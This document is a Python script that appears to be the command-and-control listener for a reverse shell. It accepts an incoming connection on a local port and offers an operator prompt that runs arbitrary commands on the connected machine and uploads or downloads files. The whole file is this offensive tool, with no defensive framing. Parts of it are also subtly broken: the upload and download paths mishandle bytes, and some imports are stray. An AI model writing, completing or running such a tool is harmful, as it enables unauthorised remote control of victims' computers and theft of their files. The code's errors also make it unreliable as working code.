from re import S
import socket
from colorama import Fore, Back, Style
import json
import os
import base64
def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def reliable_recv():
    data = ""

    while True:
        try:
            print("Waiting for result")
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue          
def shell():
    while True:
        command = input(Fore.WHITE + "* Shell#-%s: " % str(ip))
        reliable_send(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            result = reliable_recv()
            print("CD: " + result)
        elif command[:6] == "upload":
           # try:
            with open(command[7:], "rb") as fin:
                reliable_send(fin.read())
            #except:
               # failed = "Failed to upload"
               # print(failed)
                #reliable_send(failed)

        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(file_data)
        else:
            
            result = reliable_recv()
            print("Received result!")
            print(result) 


def server():
    global s
    global ip
    global target

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    s.bind(("127.0.0.1", 54321))
    s.listen(5) ## listening to 5 connections

    print(Fore.GREEN + "[+] Listening for incoming connections")

    target, ip = s.accept()
    print(Fore.GREEN + "[+] Connection established from: %s" % str(ip))
    

server()
shell()
s.close()